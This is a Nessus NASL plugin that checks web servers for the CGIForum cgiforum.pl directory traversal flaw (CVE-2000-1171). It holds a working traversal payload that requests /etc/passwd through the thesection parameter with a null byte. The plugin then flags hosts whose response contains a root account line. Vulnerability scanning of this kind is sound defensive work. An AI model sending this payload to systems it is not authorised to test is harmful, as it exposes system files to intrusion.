#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10552);
 script_bugtraq_id(1963);
 script_version ("$Revision: 1.22 $");
 script_cve_id("CVE-2000-1171");
 script_xref(name:"OSVDB", value:"451");
 
 script_name(english:"CGIForum cgiforum.pl thesection Parameter Traversal Arbitrary File Access");
 script_summary(english:"Checks for the presence of /cgi-bin/cgiforum.pl");
 
 script_set_attribute(
   attribute:"synopsis",
   value:string(
     "A web application running on the remote host has a directory\n",
     "traversal vulnerability."
   )
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The 'cgiforum.pl' CGI is installed. This CGI has a well known\n",
     "security flaw that could let a remote attacker read arbitrary files\n",
     "on the remote host."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/bugtraq/2000-11/0263.html"
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/bugtraq/2000-11/0346.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to CGIForum version 1.01 or later."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N"
 );
 script_end_attributes();

 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses");
 
 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");
 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);

foreach dir (cgi_dirs())
{
 req = string(dir,"/cgiforum.pl?thesection=../../../../../../../../etc/passwd%00");
 buf = http_send_recv3(method:"GET", item:req, port:port);
 if( isnull(buf) ) exit(0);

 if(egrep(pattern:".*root:.*:0:[01]:.*", string:buf)){
 	security_warning(port);
	exit(0);
	}
}
